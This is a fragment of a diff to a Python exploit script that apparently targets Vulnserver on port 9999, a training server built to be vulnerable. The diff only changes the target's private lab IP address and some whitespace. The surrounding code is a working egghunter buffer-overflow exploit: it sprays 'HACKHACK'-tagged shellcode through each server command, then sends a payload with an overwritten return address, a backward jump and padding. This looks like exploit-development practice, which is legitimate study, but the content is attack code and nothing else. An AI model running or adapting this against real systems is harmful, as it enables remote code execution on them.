@@ -39,13 +39,13 @@ egghunter = b"".join(egghunter)
 
 for command in [b'STATS', b'RTIME', b'LTIME', b'SRUN', b'TRUN', b'GMON', b'GDOG', b'HTER', b'LTER', b'KSTAN']:
     s = socket.socket()
-    s.connect(("10.6.52.60",9999))
+    s.connect(("10.6.55.214",9999))
     shell = command + b'HACKHACK' + shellcode
     s.send(shell)
 
 new_eip = struct.pack("<I",0x62501203)
 s = socket.socket()
-s.connect(("10.6.52.60",9999))
+s.connect(("10.6.55.214",9999))
 offset = 151
 total_length = 200
 jump_opcode = b"\xe9\x61\xff\xff\xff"
@@ -56,7 +56,7 @@ payload= [
     b"A" * (offset-len(egghunter)),
     new_eip,
     jump_opcode,
-   
+
     b"C" * (total_length-offset-len(new_eip)-len(jump_opcode)-len(egghunter))
    
 
